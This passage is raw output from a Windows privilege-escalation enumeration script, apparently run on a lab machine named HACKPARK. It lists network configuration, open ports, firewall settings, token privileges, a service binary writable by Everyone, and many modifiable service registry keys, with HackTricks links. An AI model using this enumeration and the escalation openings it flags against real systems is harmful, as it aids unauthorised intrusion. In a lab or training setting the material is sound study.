   IP Routing Enabled. . . . . . . . : No                                                                                     
   WINS Proxy Enabled. . . . . . . . : No                                                                                     
   DNS Suffix Search List. . . . . . : eu-west-1.ec2-utilities.amazonaws.com                                                  
                                       eu-west-1.compute.internal                                                             
                                                                                                                              
Ethernet adapter Ethernet 2:                                                                                                  
                                                                                                                              
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal                                                             
   Description . . . . . . . . . . . : AWS PV Network Device #0                                                               
   Physical Address. . . . . . . . . : 02-28-FC-89-8E-1B                                                                      
   DHCP Enabled. . . . . . . . . . . : Yes                                                                                    
   Autoconfiguration Enabled . . . . : Yes                                                                                    
   Link-local IPv6 Address . . . . . : fe80::e0ed:ad91:2492:caf0%14(Preferred)                                                
   IPv4 Address. . . . . . . . . . . : 10.10.253.222(Preferred)                                                               
   Subnet Mask . . . . . . . . . . . : 255.255.0.0                                                                            
   Lease Obtained. . . . . . . . . . : Friday, June 7, 2024 11:21:34 AM                                                       
   Lease Expires . . . . . . . . . . : Friday, June 7, 2024 1:21:34 PM                                                        
   Default Gateway . . . . . . . . . : 10.10.0.1                                                                              
   DHCP Server . . . . . . . . . . . : 10.10.0.1                                                                              
   DHCPv6 IAID . . . . . . . . . . . : 335943906                                                                              
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-24-DA-49-4B-08-00-27-7A-66-52                                              
   DNS Servers . . . . . . . . . . . : 10.0.0.2                                                                               
   NetBIOS over Tcpip. . . . . . . . : Enabled                                                                                
                                                                                                                              
Tunnel adapter isatap.eu-west-1.compute.internal:                                                                             
                                                                                                                              
   Media State . . . . . . . . . . . : Media disconnected                                                                     
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal                                                             
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter                                                               
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0                                                                
   DHCP Enabled. . . . . . . . . . . : No                                                                                     
   Autoconfiguration Enabled . . . . : Yes                                                                                    
                                                                                                                              
 [+] USED PORTS                                                                                                               
   [i] Check for services restricted from the outside                                                                         
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4                                                      
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       784                                                    
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4                                                      
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       2020                                                   
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4                                                      
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4                                                      
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       584                                                    
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       872                                                    
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       904                                                    
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       1128                                                   
  TCP    0.0.0.0:49161          0.0.0.0:0              LISTENING       676                                                    
  TCP    0.0.0.0:49175          0.0.0.0:0              LISTENING       668                                                    
  TCP    10.10.253.222:139      0.0.0.0:0              LISTENING       4                                                      
  TCP    [::]:80                [::]:0                 LISTENING       4                                                      
  TCP    [::]:135               [::]:0                 LISTENING       784                                                    
  TCP    [::]:445               [::]:0                 LISTENING       4                                                      
  TCP    [::]:3389              [::]:0                 LISTENING       2020                                                   
  TCP    [::]:5985              [::]:0                 LISTENING       4                                                      
  TCP    [::]:47001             [::]:0                 LISTENING       4                                                      
  TCP    [::]:49152             [::]:0                 LISTENING       584                                                    
  TCP    [::]:49153             [::]:0                 LISTENING       872                                                    
  TCP    [::]:49154             [::]:0                 LISTENING       904                                                    
  TCP    [::]:49155             [::]:0                 LISTENING       1128                                                   
  TCP    [::]:49161             [::]:0                 LISTENING       676                                                    
  TCP    [::]:49175             [::]:0                 LISTENING       668                                                    
                                                                                                                              
 [+] FIREWALL                                                                                                                 
                                                                                                                              
Firewall status:                                                                                                              
-------------------------------------------------------------------                                                           
Profile                           = Standard                                                                                  
Operational mode                  = Enable                                                                                    
Exception mode                    = Enable                                                                                    
Multicast/broadcast response mode = Enable                                                                                    
Notification mode                 = Disable                                                                                   
Group policy version              = Windows Firewall                                                                          
Remote admin mode                 = Disable                                                                                   
                                                                                                                              
Ports currently open on all network interfaces:                                                                               
Port   Protocol  Version  Program                                                                                             
-------------------------------------------------------------------                                                           
No ports are currently open on all network interfaces.                                                                        
                                                                                                                              
IMPORTANT: Command executed successfully.                                                                                     
However, "netsh firewall" is deprecated;                                                                                      
use "netsh advfirewall firewall" instead.                                                                                     
For more information on using "netsh advfirewall firewall" commands                                                           
instead of "netsh firewall", see KB article 947709                                                                            
at http://go.microsoft.com/fwlink/?linkid=121488 .                                                                            
                                                                                                                              
                                                                                                                              
                                                                                                                              
Domain profile configuration:                                                                                                 
-------------------------------------------------------------------                                                           
Operational mode                  = Enable                                                                                    
Exception mode                    = Enable                                                                                    
Multicast/broadcast response mode = Enable                                                                                    
Notification mode                 = Disable                                                                                   
                                                                                                                              
Service configuration for Domain profile:                                                                                     
Mode     Customized  Name                                                                                                     
-------------------------------------------------------------------                                                           
Enable   No          Remote Desktop                                                                                           
                                                                                                                              
Allowed programs configuration for Domain profile:                                                                            
Mode     Traffic direction    Name / Program                                                                                  
-------------------------------------------------------------------                                                           
                                                                                                                              
Port configuration for Domain profile:                                                                                        
Port   Protocol  Mode    Traffic direction     Name                                                                           
-------------------------------------------------------------------                                                           
                                                                                                                              
ICMP configuration for Domain profile:                                                                                        
Mode     Type  Description                                                                                                    
-------------------------------------------------------------------                                                           
Enable   2     Allow outbound packet too big                                                                                  
                                                                                                                              
Standard profile configuration (current):                                                                                     
-------------------------------------------------------------------                                                           
Operational mode                  = Enable                                                                                    
Exception mode                    = Enable                                                                                    
Multicast/broadcast response mode = Enable                                                                                    
Notification mode                 = Disable                                                                                   
                                                                                                                              
Service configuration for Standard profile:                                                                                   
Mode     Customized  Name                                                                                                     
-------------------------------------------------------------------                                                           
Enable   No          Remote Desktop                                                                                           
                                                                                                                              
Allowed programs configuration for Standard profile:                                                                          
Mode     Traffic direction    Name / Program                                                                                  
-------------------------------------------------------------------                                                           
                                                                                                                              
Port configuration for Standard profile:                                                                                      
Port   Protocol  Mode    Traffic direction     Name                                                                           
-------------------------------------------------------------------                                                           
                                                                                                                              
ICMP configuration for Standard profile:                                                                                      
Mode     Type  Description                                                                                                    
-------------------------------------------------------------------                                                           
Enable   2     Allow outbound packet too big                                                                                  
                                                                                                                              
Log configuration:                                                                                                            
-------------------------------------------------------------------                                                           
File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.log                                                         
Max file size   = 4096 KB                                                                                                     
Dropped packets = Disable                                                                                                     
Connections     = Disable                                                                                                     
                                                                                                                              
IMPORTANT: Command executed successfully.                                                                                     
However, "netsh firewall" is deprecated;                                                                                      
use "netsh advfirewall firewall" instead.                                                                                     
For more information on using "netsh advfirewall firewall" commands                                                           
instead of "netsh firewall", see KB article 947709                                                                            
at http://go.microsoft.com/fwlink/?linkid=121488 .                                                                            
                                                                                                                              
                                                                                                                              
                                                                                                                              
 [+] ARP                                                                                                                      
                                                                                                                              
Interface: 10.10.253.222 --- 0xe                                                                                              
  Internet Address      Physical Address      Type                                                                            
  10.10.0.1             02-c8-85-b5-5a-aa     dynamic                                                                         
  10.10.255.255         ff-ff-ff-ff-ff-ff     static                                                                          
  224.0.0.22            01-00-5e-00-00-16     static                                                                          
  224.0.0.252           01-00-5e-00-00-fc     static                                                                          
  255.255.255.255       ff-ff-ff-ff-ff-ff     static                                                                          
                                                                                                                              
 [+] ROUTES                                                                                                                   
===========================================================================                                                   
Interface List                                                                                                                
 14...02 28 fc 89 8e 1b ......AWS PV Network Device #0                                                                        
  1...........................Software Loopback Interface 1                                                                   
 13...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter                                                                        
===========================================================================                                                   
                                                                                                                              
IPv4 Route Table                                                                                                              
===========================================================================                                                   
Active Routes:                                                                                                                
Network Destination        Netmask          Gateway       Interface  Metric                                                   
          0.0.0.0          0.0.0.0        10.10.0.1    10.10.253.222     10                                                   
        10.10.0.0      255.255.0.0         On-link     10.10.253.222    266                                                   
    10.10.253.222  255.255.255.255         On-link     10.10.253.222    266                                                   
    10.10.255.255  255.255.255.255         On-link     10.10.253.222    266                                                   
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306                                                   
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306                                                   
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306                                                   
  169.254.169.123  255.255.255.255        10.10.0.1    10.10.253.222     20                                                   
  169.254.169.249  255.255.255.255        10.10.0.1    10.10.253.222     20                                                   
  169.254.169.250  255.255.255.255        10.10.0.1    10.10.253.222     20                                                   
  169.254.169.251  255.255.255.255        10.10.0.1    10.10.253.222     20                                                   
  169.254.169.253  255.255.255.255        10.10.0.1    10.10.253.222     20                                                   
  169.254.169.254  255.255.255.255        10.10.0.1    10.10.253.222     20                                                   
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306                                                   
        224.0.0.0        240.0.0.0         On-link     10.10.253.222    266                                                   
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306                                                   
  255.255.255.255  255.255.255.255         On-link     10.10.253.222    266                                                   
===========================================================================                                                   
Persistent Routes:                                                                                                            
  None                                                                                                                        
                                                                                                                              
IPv6 Route Table                                                                                                              
===========================================================================                                                   
Active Routes:                                                                                                                
 If Metric Network Destination      Gateway                                                                                   
  1    306 ::1/128                  On-link                                                                                   
 14    266 fe80::/64                On-link                                                                                   
 14    266 fe80::e0ed:ad91:2492:caf0/128                                                                                      
                                    On-link                                                                                   
  1    306 ff00::/8                 On-link                                                                                   
 14    266 ff00::/8                 On-link                                                                                   
===========================================================================                                                   
Persistent Routes:                                                                                                            
  None                                                                                                                        
                                                                                                                              
 [+] Hosts file                                                                                                               
                                                                                                                              
 [+] DNS CACHE                                                                                                                
                                                                                                                              
 [+] WIFI                                                                                                                     
[*] BASIC USER INFO                                                                                                           
   [i] Check if you are inside the Administrators group or if you have enabled any token that can be use to escalate privileges like SeImpersonatePrivilege, SeAssignPrimaryPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebbugPrivilege                                                  
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups                      
                                                                                                                              
 [+] CURRENT USER                                                                                                             
User name                    Administrator                                                                                    
Full Name                                                                                                                     
Comment                      Built-in account for administering the computer/domain                                           
User's comment                                                                                                                
Country/region code          000 (System Default)                                                                             
Account active               Yes                                                                                              
Account expires              Never                                                                                            
                                                                                                                              
Password last set            8/3/2019 10:43:23 AM                                                                             
Password expires             9/14/2019 10:43:23 AM                                                                            
Password changeable          8/3/2019 10:43:23 AM                                                                             
Password required            Yes                                                                                              
User may change password     Yes                                                                                              
                                                                                                                              
Workstations allowed         All                                                                                              
Logon script                                                                                                                  
User profile                                                                                                                  
Home directory                                                                                                                
Last logon                   6/7/2024 11:21:45 AM                                                                             
                                                                                                                              
Logon hours allowed          All                                                                                              
                                                                                                                              
Local Group Memberships      *Administrators                                                                                  
Global Group memberships     *None                                                                                            
The command completed successfully.                                                                                           
                                                                                                                              
The request will be processed at a domain controller for domain WORKGROUP.                                                    
                                                                                                                              
                                                                                                                              
USER INFORMATION                                                                                                              
----------------                                                                                                              
                                                                                                                              
User Name              SID                                                                                                    
====================== ===========================================                                                            
hackpark\administrator S-1-5-21-141259258-288879770-3894983326-500                                                            
                                                                                                                              
                                                                                                                              
GROUP INFORMATION                                                                                                             
-----------------                                                                                                             
                                                                                                                              
Group Name                                                    Type             SID          Attributes                                                                                                                                                      
============================================================= ================ ============ ===============================================================                                                                                                 
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group                                                                                                              
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group                                                                                                              
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner                                                                                                 
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group                                                                                                              
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group                                                                                                              
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group                                                                                                              
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group                                                                                                              
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group                                                                                                              
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group                                                                                                              
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group                                                                                                              
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group                                                                                                              
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288                                                                                                                                                                 
                                                                                                                              
                                                                                                                              
PRIVILEGES INFORMATION                                                                                                        
----------------------                                                                                                        
                                                                                                                              
Privilege Name                  Description                               State                                               
=============================== ========================================= ========                                            
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Enabled                                             
SeSecurityPrivilege             Manage auditing and security log          Disabled                                            
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Enabled                                             
SeLoadDriverPrivilege           Load and unload device drivers            Disabled                                            
SeSystemProfilePrivilege        Profile system performance                Disabled                                            
SeSystemtimePrivilege           Change the system time                    Disabled                                            
SeProfileSingleProcessPrivilege Profile single process                    Disabled                                            
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled                                            
SeCreatePagefilePrivilege       Create a pagefile                         Disabled                                            
SeBackupPrivilege               Back up files and directories             Disabled                                            
SeRestorePrivilege              Restore files and directories             Disabled                                            
SeShutdownPrivilege             Shut down the system                      Disabled                                            
SeDebugPrivilege                Debug programs                            Enabled                                             
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled                                            
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled                                             
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled                                            
SeUndockPrivilege               Remove computer from docking station      Disabled                                            
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled                                            
SeImpersonatePrivilege          Impersonate a client after authentication Enabled                                             
SeCreateGlobalPrivilege         Create global objects                     Enabled                                             
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled                                            
SeTimeZonePrivilege             Change the time zone                      Disabled                                            
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled                                            
                                                                                                                              
ERROR: Unable to get user claims information.                                                                                 
                                                                                                                              
 [+] USERS                                                                                                                    
                                                                                                                              
User accounts for \\HACKPARK                                                                                                  
                                                                                                                              
-------------------------------------------------------------------------------                                               
Administrator            Guest                    jeff                                                                        
The command completed successfully.                                                                                           
                                                                                                                              
                                                                                                                              
 [+] GROUPS                                                                                                                   
                                                                                                                              
Aliases for \\HACKPARK                                                                                                        
                                                                                                                              
-------------------------------------------------------------------------------                                               
*Access Control Assistance Operators                                                                                          
*Administrators                                                                                                               
*Backup Operators                                                                                                             
*Certificate Service DCOM Access                                                                                              
*Cryptographic Operators                                                                                                      
*Distributed COM Users                                                                                                        
*Event Log Readers                                                                                                            
*Guests                                                                                                                       
*Hyper-V Administrators                                                                                                       
*IIS_IUSRS                                                                                                                    
*Network Configuration Operators                                                                                              
*Performance Log Users                                                                                                        
*Performance Monitor Users                                                                                                    
*Power Users                                                                                                                  
*Print Operators                                                                                                              
*RDS Endpoint Servers                                                                                                         
*RDS Management Servers                                                                                                       
*RDS Remote Access Servers                                                                                                    
*Remote Desktop Users                                                                                                         
*Remote Management Users                                                                                                      
*Replicator                                                                                                                   
*Users                                                                                                                        
*WinRMRemoteWMIUsers__                                                                                                        
The command completed successfully.                                                                                           
                                                                                                                              
                                                                                                                              
 [+] ADMINISTRATORS GROUPS                                                                                                    
Alias name     Administrators                                                                                                 
Comment        Administrators have complete and unrestricted access to the computer/domain                                    
                                                                                                                              
Members                                                                                                                       
                                                                                                                              
-------------------------------------------------------------------------------                                               
Administrator                                                                                                                 
The command completed successfully.                                                                                           
                                                                                                                              
                                                                                                                              
 [+] CURRENT LOGGED USERS                                                                                                     
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME                                                   
>administrator         console             1  Active      none   6/7/2024 11:21 AM                                            
                                                                                                                              
 [+] Kerberos Tickets                                                                                                         
                                                                                                                              
Current LogonId is 0:0x2a0a3                                                                                                  
                                                                                                                              
Cached Tickets: (0)                                                                                                           
                                                                                                                              
 [+] CURRENT CLIPBOARD                                                                                                        
   [i] Any passwords inside the clipboard?                                                                                    
                                                                                                                              
[*] SERVICE VULNERABILITIES                                                                                                   
                                                                                                                              
 [+] SERVICE BINARY PERMISSIONS WITH WMIC and ICACLS                                                                          
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                              
C:\Program Files\Amazon\EC2Launch\EC2Launch.exe NT AUTHORITY\SYSTEM:(I)(F)                                                    
                                                BUILTIN\Administrators:(I)(F)                                                 
                                                                                                                              
C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe NT AUTHORITY\SYSTEM:(I)(F)                                                   
                                                 BUILTIN\Administrators:(I)(F)                                                
                                                                                                                              
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe NT SERVICE\TrustedInstaller:(F)                              
                                                                                                                              
C:\Program Files\Amazon\XenTools\LiteAgent.exe NT AUTHORITY\SYSTEM:(I)(F)                                                     
                                               BUILTIN\Administrators:(I)(F)                                                  
                                                                                                                              
C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe NT AUTHORITY\SYSTEM:(I)(F)                                             
                                                       BUILTIN\Administrators:(I)(F)                                          
                                                                                                                              
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)                                 
                                                                                                                              
C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)                                                              
                                                                                                                              
C:\Windows\PSSDNSVC.EXE NT AUTHORITY\SYSTEM:(I)(F)                                                                            
                        BUILTIN\Administrators:(I)(F)                                                                         
                                                                                                                              
C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)                                                     
                                                                                                                              
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)                                                                             
                                  BUILTIN\Administrators:(I)(F)                                                               
                                                                                                                              
                                                                                                                              
 [+] CHECK IF YOU CAN MODIFY ANY SERVICE REGISTRY                                                                             
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                              
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\.NETFramework                                             
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\1394ohci                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\3ware                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ACPI                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\acpiex                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\acpipagr                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AcpiPmi                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\acpitime                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ADP80XX                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\adsi                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AeLookupSvc                                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AFD                                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\agp440                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ahcache                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ALG                                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AmazonSSMAgent                                            
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AmdK8                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AmdPPM                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\amdsata                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\amdsbs                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\amdxata                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppHostSvc                                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppID                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppIDSvc                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Appinfo                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppMgmt                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppReadiness                                              
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppXSvc                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\arcsas                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ASP.NET                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ASP.NET_4.0.30319                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\aspnet_state                                              
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AsyncMac                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\atapi                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AudioEndpointBuilder                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Audiosrv                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AWSLiteAgent                                              
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AWSNVMe                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\b06bdrv                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BasicDisplay                                              
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BasicRender                                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BattC                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Beep                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\bfadfcoei                                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\bfadi                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BFE                                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BITS                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\bowser                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BrokerInfrastructure                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Browser                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\bxfcoe                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\bxois                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\cdfs                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\cdrom                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CertPropSvc                                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\cht4vbd                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CLFS                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\clr_optimization_v4.0.30319_32                            
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\clr_optimization_v4.0.30319_64                            
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CmBatt                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CNG                                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CngHwAssist                                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CompositeBus                                              
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\COMSysApp                                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\condrv                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\crypt32                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CryptSvc                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\DCLocator                                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\defragsvc                                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\DeviceAssociationService                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\DeviceInstall                                             
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Dfsc                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Dhcp                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\disk                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\dmvsc                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Dnscache                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\dot3svc                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\drmkaud                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\DsmSvc                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\DXGKrnl                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\E1G60                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Eaphost                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ebdrv                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Ec2Config                                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\EFS                                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\elxfcoe                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\elxstor                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ErrDev                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ESENT                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\EventLog                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\EventSystem                                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\exfat                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\fastfat                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\fcvsc                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\fdc                                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\fdPHost                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FDResPub                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FileInfo                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Filetrace                                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\flpydisk                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FltMgr                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FontCache                                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FsDepends                                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Fs_Rec                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FxPPM                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\gagp30kx                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\gencounter                                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\GPIOClx0101                                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HdAudAddService                                           
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HDAudBus                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HidBatt                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\hidserv                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HidUsb                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\hkmsvc                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HpSAMD                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HTTP                                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\hwpolicy                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\hyperkbd                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HyperVideo                                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\i8042prt                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\iaStorAV                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\iaStorV                                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ibbus                                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\IEEtwCollectorService                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\IKEEXT                                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\inetaccs                                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\InetInfo                                                  
